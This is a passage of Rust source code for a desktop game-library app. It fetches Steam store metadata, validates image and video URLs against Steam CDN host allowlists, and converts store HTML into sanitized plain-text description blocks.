use crate::db::StoreMetadataUpdate;
use crate::db::pricing::{self, PriceObservation};
use crate::db::rich_metadata::{
    DescriptionBlock, GameMediaItem, GameMediaKind, MAX_BLOCK_CHARS, MAX_DESCRIPTION_BLOCKS,
    MAX_LANGUAGES_CHARS, MAX_LIST_ITEMS, MAX_MEDIA_ITEMS, MAX_NOTICE_CHARS, MAX_STRUCTURED_CHARS,
    MAX_URL_CHARS, RichMetadataUpdate, StructuredDescription,
};
use crate::error::{AppError, AppResult};
use crate::steam::drm::{self, DrmSignals};
use chrono::NaiveDate;
use reqwest::{Client, StatusCode, header, redirect::Policy};
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::sync::OnceLock;
use std::time::Duration;

// Steamworks GetOwnedGames solo documenta nombre e icono. La descripción y los
// créditos se aíslan aquí porque proceden del endpoint público de la tienda,
// cuyo contrato no forma parte de la Steamworks Web API documentada.
const STORE_DETAILS_ENDPOINT: &str = "https://store.steampowered.com/api/appdetails";
/// País con el que se consulta la tienda. Determina la moneda de
/// `price_overview`, así que viaja junto al precio observado: sin él, la
/// moneda guardada no sería reproducible.
pub const STORE_COUNTRY: &str = "ES";
const MAX_STORE_RESPONSE_BYTES: usize = 2 * 1024 * 1024;
const MAX_DESCRIPTION_CHARS: usize = 8_000;
const MAX_METADATA_ITEMS: usize = 64;
/// Tope de caracteres de HTML crudo que se analizan por descripción. Evita un
/// trabajo desproporcionado si la tienda devuelve un documento anómalo.
const MAX_STRUCTURED_INPUT_CHARS: usize = 200_000;
/// Tope de texto acumulado en el buffer antes de cerrar un bloque.
const MAX_BUFFERED_CHARS: usize = MAX_BLOCK_CHARS * 4;

/// Hosts oficiales desde los que Steam sirve capturas e imágenes de ficha.
const MEDIA_HOSTS: &[&str] = &[
    "shared.steamstatic.com",
    "shared.cloudflare.steamstatic.com",
    "shared.akamai.steamstatic.com",
    "shared.fastly.steamstatic.com",
    "cdn.cloudflare.steamstatic.com",
    "cdn.akamai.steamstatic.com",
    "cdn.fastly.steamstatic.com",
    "media.steampowered.com",
];

/// Hosts oficiales desde los que Steam sirve los tráileres.
const VIDEO_HOSTS: &[&str] = &[
    "video.akamai.steamstatic.com",
    "video.cloudflare.steamstatic.com",
    "video.fastly.steamstatic.com",
    "cdn.akamai.steamstatic.com",
    "cdn.cloudflare.steamstatic.com",
    "cdn.fastly.steamstatic.com",
    "shared.akamai.steamstatic.com",
    "shared.cloudflare.steamstatic.com",
    "shared.steamstatic.com",
];

/// Hosts admitidos para el enlace de Metacritic que publica la propia tienda.
const METACRITIC_HOSTS: &[&str] = &["www.metacritic.com", "metacritic.com"];

/// Elementos cuyo contenido se descarta entero, no solo sus etiquetas.
const RAW_TEXT_ELEMENTS: &[&str] = &[
    "script", "style", "iframe", "noscript", "template", "svg", "math", "object",
];

/// Elementos que separan bloques de texto.
const BLOCK_ELEMENTS: &[&str] = &[
    "p",
    "br",
    "hr",
    "div",
    "section",
    "article",
    "header",
    "footer",
    "aside",
    "main",
    "blockquote",
    "pre",
    "figure",
    "figcaption",
    "table",
    "thead",
    "tbody",
    "tfoot",
    "tr",
    "td",
    "th",
    "dl",
    "dt",
    "dd",
    "form",
    "address",
    "details",
    "summary",
    "center",
];

/// Vista reducida del paquete: sólo los campos de biblioteca. En producción no
/// se usa —la cola persiste el paquete entero— pero las pruebas comprueban con
/// ella que ese subconjunto del contrato con la tienda no se rompe.
///
/// La variante con datos pesa más de doscientos bytes frente a una vacía, así
/// que se encapsula: mover el enum por valor no debe arrastrar la diferencia.
#[cfg(test)]
#[derive(Debug)]
pub enum StoreMetadataOutcome {
    Found(Box<StoreMetadataUpdate>),
    Unavailable,
}

/// Todo lo que una única respuesta de `appdetails` aporta: los campos que ya
/// consumía la biblioteca más los metadatos enriquecidos de ficha. Se agrupan
/// para no duplicar la petición de red.
#[derive(Debug)]
pub struct StoreMetadataBundle {
    pub metadata: StoreMetadataUpdate,
    pub rich: RichMetadataUpdate,
    /// Descriptores de contenido publicados por Steam. Todavía no hay columna
    /// para persistirlos, así que viajan aparte en vez de forzar el esquema.
    #[allow(dead_code)]
    pub content_descriptors: StoreContentDescriptors,
    /// Precio observado en esta misma respuesta. `None` cuando la ficha no
    /// trae `price_overview` —gratuito, sin publicar o retirado—, que no es lo
    /// mismo que un precio de cero.
    pub price: Option<PriceObservation>,
}

#[derive(Debug)]
pub enum StoreBundleOutcome {
    Found(Box<StoreMetadataBundle>),
    Unavailable,
}

/// Descriptores de contenido sensible declarados por la tienda.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct StoreContentDescriptors {
    pub ids: Vec<u32>,
    pub notes: Option<String>,
}

#[derive(Debug)]
pub struct StoreMetadataFailure {
    pub error: AppError,
    pub retry_after: Option<Duration>,
}

impl From<AppError> for StoreMetadataFailure {
    fn from(error: AppError) -> Self {
        Self {
            error,
            retry_after: None,
        }
    }
}

#[derive(Debug, Deserialize)]
struct StoreEnvelope {
    success: bool,
    data: Option<StoreData>,
}

#[derive(Debug, Deserialize)]
struct StoreData {
    #[serde(default)]
    is_free: bool,
    short_description: Option<String>,
    about_the_game: Option<String>,
    detailed_description: Option<String>,
    supported_languages: Option<String>,
    website: Option<String>,
    metacritic: Option<StoreMetacritic>,
    required_age: Option<serde_json::Value>,
    controller_support: Option<String>,
    developers: Option<Vec<String>>,
    publishers: Option<Vec<String>>,
    genres: Option<Vec<StoreLabel>>,
    categories: Option<Vec<StoreLabel>>,
    achievements: Option<StoreAchievements>,
    background: Option<String>,
    background_raw: Option<String>,
    header_image: Option<String>,
    capsule_image: Option<String>,
    /// Sistemas en los que la tienda ofrece el juego. Ausente en fichas
    /// incompletas, y ausente no significa incompatible.
    platforms: Option<StorePlatforms>,
    release_date: Option<StoreReleaseDate>,
    screenshots: Option<Vec<StoreScreenshot>>,
    movies: Option<Vec<StoreMovie>>,
    drm_notice: Option<String>,
    /// Se conserva sin analizar: el formato del importe es una decisión del
    /// modelo de precios y lo interpreta `db::pricing`, que se puede probar sin
    /// tocar la red.
    price_overview: Option<serde_json::Value>,
    ext_user_account_notice: Option<String>,
    legal_notice: Option<String>,
    content_descriptors: Option<StoreContentDescriptorsPayload>,
}

#[derive(Debug, Deserialize)]
struct StoreLabel {
    id: Option<serde_json::Value>,
    description: String,
}

#[derive(Debug, Deserialize)]
struct StoreReleaseDate {
    #[serde(default)]
    coming_soon: bool,
    date: Option<String>,
}

#[derive(Debug, Deserialize)]
struct StoreAchievements {
    total: Option<u32>,
}

#[derive(Debug, Default, Deserialize)]
struct StorePlatforms {
    #[serde(default)]
    windows: bool,
    #[serde(default)]
    mac: bool,
    #[serde(default)]
    linux: bool,
}

#[derive(Debug, Deserialize)]
struct StoreMetacritic {
    score: Option<serde_json::Value>,
    url: Option<String>,
}

#[derive(Debug, Deserialize)]
struct StoreScreenshot {
    id: Option<serde_json::Value>,
    path_thumbnail: Option<String>,
    path_full: Option<String>,
}

#[derive(Debug, Deserialize)]
struct StoreMovie {
    id: Option<serde_json::Value>,
    thumbnail: Option<String>,
    webm: Option<StoreMovieSources>,
    mp4: Option<StoreMovieSources>,
}

#[derive(Debug, Deserialize)]
struct StoreMovieSources {
    #[serde(rename = "480")]
    low: Option<String>,
    max: Option<String>,
}

#[derive(Debug, Deserialize)]
struct StoreContentDescriptorsPayload {
    #[serde(default)]
    ids: Vec<serde_json::Value>,
    notes: Option<String>,
}

/// Igual que [`fetch_with_retry_hint`], pero conserva además los metadatos
/// enriquecidos de ficha. Una sola petición cubre ambos usos.
pub async fn fetch_bundle_with_retry_hint(
    app_id: u32,
) -> Result<StoreBundleOutcome, StoreMetadataFailure> {
    if app_id == 0 {
        return Err(AppError::validation("El AppID de Steam no es válido.").into());
    }
    fetch_from_endpoint(
        store_client().map_err(StoreMetadataFailure::from)?,
        STORE_DETAILS_ENDPOINT,
        app_id,
    )
    .await
}

fn store_client() -> AppResult<&'static Client> {
    static CLIENT: OnceLock<Result<Client, AppError>> = OnceLock::new();
    match CLIENT.get_or_init(|| {
        Client::builder()
            .connect_timeout(Duration::from_secs(5))
            .timeout(Duration::from_secs(12))
            .redirect(Policy::none())
            .user_agent("Vindexa/0.1 (+https://vindexa.app)")
            .build()
            .map_err(|_| {
                AppError::new(
                    "steam_store_http_client",
                    "No se pudo preparar la conexión segura con la tienda de Steam.",
                )
            })
    }) {
        Ok(client) => Ok(client),
        Err(error) => Err(error.clone()),
    }
}

async fn fetch_from_endpoint(
    client: &Client,
    endpoint: &str,
    app_id: u32,
) -> Result<StoreBundleOutcome, StoreMetadataFailure> {
    let mut response = client
        .get(endpoint)
        .query(&[
            ("appids", app_id.to_string()),
            ("l", "spanish".to_string()),
            ("cc", STORE_COUNTRY.to_string()),
        ])
        .send()
        .await
        .map_err(|error| StoreMetadataFailure::from(classify_store_error(error)))?;
    let status = response.status();
    if status.is_redirection() {
        return Err(AppError::new(
            "steam_store_redirect",
            "La tienda de Steam redirigió inesperadamente la ficha.",
        )
        .into());
    }
    if status == StatusCode::TOO_MANY_REQUESTS {
        return Err(StoreMetadataFailure {
            error: AppError::new(
                "steam_store_rate_limited",
                "Steam ha limitado temporalmente la carga de fichas.",
            ),
            retry_after: parse_retry_after(response.headers().get(header::RETRY_AFTER)),
        });
    }
    if !status.is_success() {
        return Err(AppError::new(
            "steam_store_status",
            format!("La tienda de Steam respondió con el estado {status}."),
        )
        .into());
    }
    let content_type = response
        .headers()
        .get(header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .and_then(|value| value.split(';').next())
        .map(str::trim);
    if !content_type.is_some_and(|value| value.eq_ignore_ascii_case("application/json")) {
        return Err(AppError::new(
            "steam_store_content_type",
            "La tienda de Steam devolvió un tipo de contenido inesperado.",
        )
        .into());
    }
    if response
        .content_length()
        .is_some_and(|length| length > MAX_STORE_RESPONSE_BYTES as u64)
    {
        return Err(AppError::new(
            "steam_store_too_large",
            "La ficha de Steam supera el tamaño máximo permitido.",
        )
        .into());
    }
    let mut bytes = Vec::new();
    while let Some(chunk) = response
        .chunk()
        .await
        .map_err(|error| StoreMetadataFailure::from(classify_store_error(error)))?
    {
        if bytes.len().saturating_add(chunk.len()) > MAX_STORE_RESPONSE_BYTES {
            return Err(AppError::new(
                "steam_store_too_large",
                "La ficha de Steam supera el tamaño máximo permitido.",
            )
            .into());
        }
        bytes.extend_from_slice(&chunk);
    }
    parse_store_bundle(app_id, &bytes).map_err(StoreMetadataFailure::from)
}

fn parse_retry_after(value: Option<&header::HeaderValue>) -> Option<Duration> {
    let seconds = value?.to_str().ok()?.trim().parse::<u64>().ok()?;
    Some(Duration::from_secs(seconds.clamp(1, 3_600)))
}

/// Reduce el paquete a los campos de biblioteca para las pruebas de contrato.
#[cfg(test)]
fn parse_store_response(app_id: u32, bytes: &[u8]) -> AppResult<StoreMetadataOutcome> {
    Ok(match parse_store_bundle(app_id, bytes)? {
        StoreBundleOutcome::Found(bundle) => StoreMetadataOutcome::Found(Box::new(bundle.metadata)),
        StoreBundleOutcome::Unavailable => StoreMetadataOutcome::Unavailable,
    })
}

fn parse_store_bundle(app_id: u32, bytes: &[u8]) -> AppResult<StoreBundleOutcome> {
    let mut envelopes: HashMap<String, StoreEnvelope> =
        serde_json::from_slice(bytes).map_err(|_| {
            AppError::new(
                "steam_store_response",
                "Steam devolvió una ficha que Vindexa no pudo interpretar.",
            )
        })?;
    let Some(envelope) = envelopes.remove(&app_id.to_string()) else {
        return Ok(StoreBundleOutcome::Unavailable);
    };
    if !envelope.success {
        return Ok(StoreBundleOutcome::Unavailable);
    }
    let Some(mut data) = envelope.data else {
        return Ok(StoreBundleOutcome::Unavailable);
    };

    let description = data
        .about_the_game
        .as_deref()
        .map(sanitize_store_text)
        .filter(|value| !value.is_empty())
        .or_else(|| {
            data.short_description
                .as_deref()
                .map(sanitize_store_text)
                .filter(|value| !value.is_empty())
        });
    let is_early_access = data.genres.as_ref().is_some_and(|genres| {
        genres.iter().any(|genre| {
            genre
                .id
                .as_ref()
                .is_some_and(|id| id.as_str() == Some("70") || id.as_u64() == Some(70))
        })
    });
    let genres = unique_labels(data.genres.take());
    let categories = unique_labels(data.categories.take());

    // Avisos oficiales ya convertidos a texto plano: se guardan y se clasifican
    // sobre la misma cadena, para que la evidencia sea exactamente lo mostrado.
    let drm_notice = data
        .drm_notice
        .as_deref()
        .map(|value| sanitize_bounded_text(value, MAX_NOTICE_CHARS))
        .filter(|value| !value.is_empty());
    let ext_user_account_notice = data
        .ext_user_account_notice
        .as_deref()
        .map(|value| sanitize_bounded_text(value, MAX_NOTICE_CHARS))
        .filter(|value| !value.is_empty());
    let legal_notice = data
        .legal_notice
        .as_deref()
        .map(|value| sanitize_bounded_text(value, MAX_NOTICE_CHARS))
        .filter(|value| !value.is_empty());
    let drm = drm::classify(&DrmSignals {
        drm_notice: drm_notice.as_deref(),
        ext_user_account_notice: ext_user_account_notice.as_deref(),
        legal_notice: legal_notice.as_deref(),
        categories: &categories,
        is_free: data.is_free,
        store_response_complete: true,
    });

    let hero_url = data
        .background_raw
        .as_deref()
        .and_then(|value| sanitize_hero_url(value, app_id))
        .or_else(|| {
            data.background
                .as_deref()
                .and_then(|value| sanitize_hero_url(value, app_id))
        });
    let header_url = data
        .header_image
        .as_deref()
        .and_then(|value| sanitize_library_url(value, app_id));
    let capsule_url = data
        .capsule_image
        .as_deref()
        .and_then(|value| sanitize_library_url(value, app_id));
    let background_url = data
        .background
        .as_deref()
        .and_then(|value| sanitize_background_url(value, app_id));

    let metadata = StoreMetadataUpdate {
        short_description: description,
        hero_url,
        developer: join_names(data.developers.take()),
        publisher: join_names(data.publishers.take()),
        header_url: header_url.clone(),
        capsule_url: capsule_url.clone(),
        genres,
        categories,
        achievements_total: data.achievements.as_ref().and_then(|value| value.total),
        release_date: data.release_date.as_ref().and_then(normalize_release_date),
        is_free: data.is_free,
        is_early_access,
        // Sin bloque `platforms` no se afirma nada: `None` viaja hasta la base y
        // la interfaz se abstiene en vez de dar por hecho que no es compatible.
        platform_windows: data.platforms.as_ref().map(|value| value.windows),
        platform_mac: data.platforms.as_ref().map(|value| value.mac),
        platform_linux: data.platforms.as_ref().map(|value| value.linux),
    };

    // Base oficial desde la que derivar los assets hermanos de alta resolución,
    // con la misma regla que `art_cache::derive_library_asset`. Si la respuesta
    // no trae ninguna, se usa la URL por convención que ya emplea `steam::local`.
    let library_base = [header_url.as_deref(), capsule_url.as_deref()]
        .into_iter()
        .flatten()
        .find(|value| derive_library_asset(value, app_id, "header.jpg").is_some());
    let library_asset = |file_name: &str| {
        library_base
            .and_then(|base| derive_library_asset(base, app_id, file_name))
            .unwrap_or_else(|| conventional_library_asset(app_id, file_name))
    };

    let rich = RichMetadataUpdate {
        detailed_description: data
            .detailed_description
            .as_deref()
            .and_then(structure_store_html),
        about_the_game: data
            .about_the_game
            .as_deref()
            .and_then(structure_store_html),
        supported_languages: data
            .supported_languages
            .as_deref()
            .map(|value| sanitize_bounded_text(value, MAX_LANGUAGES_CHARS))
            .filter(|value| !value.is_empty()),
        website_url: data.website.as_deref().and_then(sanitize_website_url),
        metacritic_score: data
            .metacritic
            .as_ref()
            .and_then(|value| value.score.as_ref())
            .and_then(json_u64)
            .filter(|score| *score <= 100)
            .map(|score| score as u8),
        metacritic_url: data
            .metacritic
            .as_ref()
            .and_then(|value| value.url.as_deref())
            .and_then(sanitize_metacritic_url),
        required_age: data
            .required_age
            .as_ref()
            .and_then(json_u64)
            .filter(|age| *age <= 100)
            .map(|age| age as u32),
        controller_support: data
            .controller_support
            .as_deref()
            .map(|value| value.trim().to_ascii_lowercase())
            .filter(|value| matches!(value.as_str(), "full" | "partial")),
        background_url,
        library_hero_url: Some(library_asset("library_hero.jpg")),
        library_logo_url: Some(library_asset("logo.png")),
        // `appdetails` no publica la colocación del logotipo: se deja sin
        // afirmar en vez de inventar una posición.
        logo_position: None,
        drm_notice,
        drm: Some(drm),
        media: Some(collect_media(app_id, &data)),
    };

    let content_descriptors = data
        .content_descriptors
        .as_ref()
        .map(|payload| StoreContentDescriptors {
            ids: payload
                .ids
                .iter()
                .filter_map(json_u64)
                .filter(|id| *id <= u64::from(u32::MAX))
                .map(|id| id as u32)
                .take(MAX_METADATA_ITEMS)
                .collect(),
            notes: payload
                .notes
                .as_deref()
                .map(|value| sanitize_bounded_text(value, MAX_NOTICE_CHARS))
                .filter(|value| !value.is_empty()),
        })
        .unwrap_or_default();

    let price = data
        .price_overview
        .as_ref()
        .map(|value| pricing::parse_store_price_overview(app_id, Some(STORE_COUNTRY), value))
        .transpose()?
        .flatten();

    Ok(StoreBundleOutcome::Found(Box::new(StoreMetadataBundle {
        metadata,
        rich,
        content_descriptors,
        price,
    })))
}

/// Capturas y tráileres oficiales, ordenados y acotados. Cada URL debe estar
/// servida por HTTPS desde un host de la CDN de Steam y ligada al AppID o al
/// identificador del propio medio; si no, se descarta en vez de guardarse.
fn collect_media(app_id: u32, data: &StoreData) -> Vec<GameMediaItem> {
    let mut media = Vec::new();
    let mut position = 0_u32;
    for screenshot in data.screenshots.iter().flatten() {
        if media.len() >= MAX_MEDIA_ITEMS {
            break;
        }
        let Some(id) = screenshot.id.as_ref().and_then(json_u64) else {
            continue;
        };
        let thumbnail_url = screenshot
            .path_thumbnail
            .as_deref()
            .and_then(|value| sanitize_media_url(value, app_id, id, MEDIA_HOSTS));
        let full_url = screenshot
            .path_full
            .as_deref()
            .and_then(|value| sanitize_media_url(value, app_id, id, MEDIA_HOSTS));
        if thumbnail_url.is_none() && full_url.is_none() {
            continue;
        }
        media.push(GameMediaItem {
            media_id: format!("screenshot:{id}"),
            kind: GameMediaKind::Screenshot,
            thumbnail_url,
            full_url,
            alt_url: None,
            position,
        });
        position += 1;
    }

    position = 0;
    for movie in data.movies.iter().flatten() {
        if media.len() >= MAX_MEDIA_ITEMS {
            break;
        }
        let Some(id) = movie.id.as_ref().and_then(json_u64) else {
            continue;
        };
        let best = |sources: &Option<StoreMovieSources>| {
            sources.as_ref().and_then(|sources| {
                sources
                    .max
                    .as_deref()
                    .or(sources.low.as_deref())
                    .and_then(|value| sanitize_media_url(value, app_id, id, VIDEO_HOSTS))
            })
        };
        let full_url = best(&movie.mp4);
        let alt_url = best(&movie.webm);
        let thumbnail_url = movie
            .thumbnail
            .as_deref()
            .and_then(|value| sanitize_media_url(value, app_id, id, MEDIA_HOSTS));
        if thumbnail_url.is_none() && full_url.is_none() && alt_url.is_none() {
            continue;
        }
        media.push(GameMediaItem {
            media_id: format!("movie:{id}"),
            kind: GameMediaKind::Movie,
            thumbnail_url,
            full_url,
            alt_url,
            position,
        });
        position += 1;
    }
    media
}

fn json_u64(value: &serde_json::Value) -> Option<u64> {
    value
        .as_u64()
        .or_else(|| value.as_str()?.trim().parse::<u64>().ok())
}

fn normalize_release_date(value: &StoreReleaseDate) -> Option<String> {
    if value.coming_soon {
        return None;
    }
    let normalized = value.date.as_deref()?.trim().replace(',', " ");
    let parts = normalized.split_whitespace().collect::<Vec<_>>();
    if parts.len() != 3 {
        return None;
    }
    let day = parts[0].parse::<u32>().ok()?;
    let month = match parts[1].to_uppercase().as_str() {
        "ENE" | "JAN" => 1,
        "FEB" => 2,
        "MAR" => 3,
        "ABR" | "APR" => 4,
        "MAY" => 5,
        "JUN" => 6,
        "JUL" => 7,
        "AGO" | "AUG" => 8,
        "SEP" => 9,
        "OCT" => 10,
        "NOV" => 11,
        "DIC" | "DEC" => 12,
        _ => return None,
    };
    let year = parts[2].parse::<i32>().ok()?;
    NaiveDate::from_ymd_opt(year, month, day).map(|date| date.format("%Y-%m-%d").to_string())
}

fn join_names(values: Option<Vec<String>>) -> Option<String> {
    let values = values?
        .into_iter()
        .take(16)
        .map(|value| sanitize_store_text(&value))
        .filter(|value| !value.is_empty())
        .collect::<Vec<_>>();
    (!values.is_empty()).then(|| values.join(", "))
}

fn unique_labels(values: Option<Vec<StoreLabel>>) -> Vec<String> {
    let mut seen = HashSet::new();
    values
        .unwrap_or_default()
        .into_iter()
        .take(MAX_METADATA_ITEMS)
        .map(|value| sanitize_store_text(&value.description))
        .filter(|value| !value.is_empty())
        .filter(|value| seen.insert(value.to_lowercase()))
        .collect()
}

fn sanitize_hero_url(value: &str, app_id: u32) -> Option<String> {
    let parsed = url::Url::parse(value).ok()?;
    if parsed.scheme() != "https"
        || !parsed.username().is_empty()
        || parsed.password().is_some()
        || parsed.port().is_some()
        || parsed.fragment().is_some()
    {
        return None;
    }
    let expected_path = format!("/images/storepagebackground/app/{app_id}");
    if parsed.host_str() != Some("store.akamai.steamstatic.com") || parsed.path() != expected_path {
        return None;
    }
    if parsed.query_pairs().any(|(key, value)| {
        key != "t" || value.is_empty() || !value.bytes().all(|byte| byte.is_ascii_digit())
    }) {
        return None;
    }
    Some(parsed.into())
}

/// Cabeceras/cápsulas oficiales del store: Steam las sirve desde hosts de CDN
/// permitidos bajo `/apps/{app_id}/` (a veces con directorio hash) y un cache
/// buster `?t=<dígitos>` opcional.
fn sanitize_library_url(value: &str, app_id: u32) -> Option<String> {
    let parsed = url::Url::parse(value).ok()?;
    if parsed.scheme() != "https"
        || !parsed.username().is_empty()
        || parsed.password().is_some()
        || parsed.port().is_some()
        || parsed.fragment().is_some()
    {
        return None;
    }
    let allowed_host = matches!(
        parsed.host_str()?,
        "shared.steamstatic.com"
            | "shared.cloudflare.steamstatic.com"
            | "cdn.cloudflare.steamstatic.com"
            | "shared.akamai.steamstatic.com"
            | "media.steampowered.com"
    );
    if !allowed_host || !parsed.path().contains(&format!("/apps/{app_id}/")) {
        return None;
    }
    if parsed.query_pairs().any(|(key, value)| {
        key != "t" || value.is_empty() || !value.bytes().all(|byte| byte.is_ascii_digit())
    }) {
        return None;
    }
    Some(parsed.into())
}

/// Deriva un asset hermano dentro del mismo directorio `/apps/{app_id}/` de la
/// CDN oficial, con la misma regla que `art_cache::derive_library_asset`: host
/// permitido, sin query ni fragmento y prefijo de ruta tomado de una URL que la
/// propia tienda acaba de devolver.
fn derive_library_asset(source: &str, app_id: u32, file_name: &str) -> Option<String> {
    let url = url::Url::parse(source).ok()?;
    if url.scheme() != "https" || url.fragment().is_some() {
        return None;
    }
    let host = url.host_str()?;
    if !MEDIA_HOSTS.contains(&host) {
        return None;
    }
    let marker = format!("/apps/{app_id}/");
    let prefix = url.path().split_once(&marker)?.0;
    Some(format!("https://{host}{prefix}{marker}{file_name}"))
}

/// URL por convención de la CDN oficial, la misma forma que ya genera
/// `steam::local` para la portada y la cabecera cuando no hay otra fuente.
fn conventional_library_asset(app_id: u32, file_name: &str) -> String {
    format!("https://shared.steamstatic.com/store_item_assets/steam/apps/{app_id}/{file_name}")
}

/// Fondo de la página de tienda: Steam lo publica en su host de fondos o como
/// un asset más del directorio del juego. Se admiten ambas formas oficiales.
fn sanitize_background_url(value: &str, app_id: u32) -> Option<String> {
    sanitize_hero_url(value, app_id)
        .or_else(|| sanitize_media_url(value, app_id, u64::from(app_id), MEDIA_HOSTS))
}

/// Capturas, miniaturas y tráileres. La ruta debe nombrar el AppID o el
/// identificador del propio medio, de modo que una respuesta manipulada no
/// pueda colar un recurso de otro juego ni de otro origen.
fn sanitize_media_url(value: &str, app_id: u32, media_key: u64, hosts: &[&str]) -> Option<String> {
    let parsed = url::Url::parse(value.trim()).ok()?;
    if parsed.scheme() != "https"
        || !parsed.username().is_empty()
        || parsed.password().is_some()
        || parsed.port().is_some()
        || parsed.fragment().is_some()
    {
        return None;
    }
    if !hosts.contains(&parsed.host_str()?) {
        return None;
    }
    let path = parsed.path();
    let bound = path.contains(&format!("/apps/{app_id}/"))
        || path.contains(&format!("/apps/{media_key}/"))
        || path.contains(&format!("/store_trailers/{media_key}/"));
    if !bound {
        return None;
    }
    if parsed.query_pairs().any(|(key, value)| {
        key != "t" || value.is_empty() || !value.bytes().all(|byte| byte.is_ascii_digit())
    }) {
        return None;
    }
    let normalized: String = parsed.into();
    (normalized.chars().count() <= MAX_URL_CHARS).then_some(normalized)
}

/// Enlace de Metacritic tal y como lo publica la ficha oficial.
fn sanitize_metacritic_url(value: &str) -> Option<String> {
    let parsed = url::Url::parse(value.trim()).ok()?;
    if parsed.scheme() != "https"
        || !parsed.username().is_empty()
        || parsed.password().is_some()
        || parsed.port().is_some()
        || parsed.fragment().is_some()
        || !METACRITIC_HOSTS.contains(&parsed.host_str()?)
    {
        return None;
    }
    let normalized: String = parsed.into();
    (normalized.chars().count() <= MAX_URL_CHARS).then_some(normalized)
}

/// Web oficial del juego. El host es de un tercero y no se puede validar contra
/// ninguna lista, así que la exigencia es estructural: HTTPS, host presente, sin
/// credenciales incrustadas y sin esquemas ejecutables (`javascript:`, `data:`).
fn sanitize_website_url(value: &str) -> Option<String> {
    let parsed = url::Url::parse(value.trim()).ok()?;
    if parsed.scheme() != "https"
        || !parsed.username().is_empty()
        || parsed.password().is_some()
        || parsed.host_str().is_none_or(str::is_empty)
    {
        return None;
    }
    let normalized: String = parsed.into();
    (normalized.chars().count() <= MAX_URL_CHARS).then_some(normalized)
}

fn sanitize_store_text(value: &str) -> String {
    sanitize_bounded_text(value, MAX_DESCRIPTION_CHARS)
}

/// Convierte HTML de la tienda en una sola línea de texto plano acotada. No
/// conserva ninguna etiqueta ni atributo, así que ningún `on*=`, `javascript:`
/// ni `<script>` puede sobrevivir.
fn sanitize_bounded_text(value: &str, max_chars: usize) -> String {
    let mut without_tags = String::with_capacity(value.len().min(max_chars));
    let mut in_tag = false;
    for character in value.chars() {
        match character {
            '<' => {
                in_tag = true;
                without_tags.push(' ');
            }
            '>' if in_tag => {
                in_tag = false;
                without_tags.push(' ');
            }
            _ if !in_tag => without_tags.push(character),
            _ => {}
        }
    }
    let decoded = decode_basic_entities(&without_tags);
    let normalized = decoded.split_whitespace().collect::<Vec<_>>().join(" ");
    tighten_punctuation(&normalized)
        .chars()
        .take(max_chars)
        .collect()
}

/// Quita el espacio que deja al desaparecer una etiqueta en línea justo antes
/// de un signo de cierre: «Espa&ntilde;ol<strong>*</strong>, Ingl&eacute;s» no
/// debe leerse «Español * , Inglés».
fn tighten_punctuation(value: &str) -> String {
    let mut output = String::with_capacity(value.len());
    for character in value.chars() {
        if character != ' '
            && matches!(
                character,
                ',' | '.' | ';' | ':' | '!' | '?' | '%' | ')' | ']' | '}' | '»' | '”' | '’'
            )
            && output.ends_with(' ')
        {
            output.pop();
        }
        output.push(character);
    }
    output
}

// ---------------------------------------------------------------------------
// HTML de la tienda a descripción estructurada
// ---------------------------------------------------------------------------

/// Convierte el HTML crudo de `detailed_description` / `about_the_game` en una
/// [`StructuredDescription`] de bloques con **texto plano**.
///
/// Vindexa no guarda el HTML de Steam. Este analizador:
///
/// - descarta por completo el contenido de `script`, `style`, `iframe`,
///   `noscript`, `template`, `svg`, `math` y `object`;
/// - nunca emite atributos, así que `onerror=`, `onload=`, `href="javascript:"`
///   o `src="data:…"` desaparecen con la etiqueta que los contenía;
/// - respeta comillas al saltar una etiqueta, de modo que un `>` dentro de un
///   atributo no reabre el flujo de texto;
/// - reconoce encabezados (`h1`-`h6`), listas (`ul`, `ol`, `li`) y separadores
///   de bloque, y descodifica solo entidades básicas.
///
/// El resultado se serializa como JSON, de modo que la interfaz puede maquetar
/// la ficha sin usar jamás `dangerouslySetInnerHTML`.
fn structure_store_html(value: &str) -> Option<StructuredDescription> {
    let characters: Vec<char> = value.chars().take(MAX_STRUCTURED_INPUT_CHARS).collect();
    let mut builder = DescriptionBuilder::default();
    let mut index = 0;
    while index < characters.len() {
        if characters[index] != '<' {
            builder.push(characters[index]);
            index += 1;
            continue;
        }
        if characters[index..].starts_with(&['<', '!', '-', '-']) {
            index =
                skip_until(&characters, index + 4, &['-', '-', '>']).unwrap_or(characters.len());
            continue;
        }
        if characters[index..].starts_with(&['<', '!'])
            || characters[index..].starts_with(&['<', '?'])
        {
            index = skip_until(&characters, index + 2, &['>']).unwrap_or(characters.len());
            continue;
        }
        let Some(tag) = parse_tag(&characters, index) else {
            // No es una etiqueta: es un `<` literal del texto.
            builder.push('<');
            index += 1;
            continue;
        };
        if !tag.closing && RAW_TEXT_ELEMENTS.contains(&tag.name.as_str()) {
            builder.boundary();
            index = find_closing_tag(&characters, tag.end, &tag.name).unwrap_or(tag.end);
            continue;
        }
        apply_tag(&mut builder, &tag);
        index = tag.end;
    }
    let description = builder.finish();
    (!description.is_empty()).then_some(description)
}

fn apply_tag(builder: &mut DescriptionBuilder, tag: &ParsedTag) {
    let name = tag.name.as_str();
    if let Some(level) = heading_level(name) {
        if tag.closing {
            builder.boundary();
        } else {
            builder.open_heading(level);
        }
        return;
    }
    match name {
        "ul" | "ol" => {
            if tag.closing {
                builder.close_list();
            } else {
                builder.open_list(name == "ol");
            }
        }
        "li" => builder.boundary(),
        _ if BLOCK_ELEMENTS.contains(&name) => builder.boundary(),
        // Cualquier otro elemento es en línea: se ignora la etiqueta y se
        // conserva su texto. Sus atributos nunca llegan a la salida.
        _ => {}
    }
}

fn heading_level(name: &str) -> Option<u8> {
    let mut characters = name.chars();
    if characters.next()? != 'h' {
        return None;
    }
    let level = characters.next()?.to_digit(10)? as u8;
    if characters.next().is_some() || !(1..=6).contains(&level) {
        return None;
    }
    Some(level)
}

struct ParsedTag {
    name: String,
    closing: bool,
    end: usize,
}

fn parse_tag(characters: &[char], start: usize) -> Option<ParsedTag> {
    let mut index = start + 1;
    let closing = *characters.get(index)? == '/';
    if closing {
        index += 1;
    }
    if !characters.get(index)?.is_ascii_alphabetic() {
        return None;
    }
    let mut name = String::new();
    while let Some(character) = characters.get(index).filter(|c| c.is_ascii_alphanumeric()) {
        name.push(character.to_ascii_lowercase());
        index += 1;
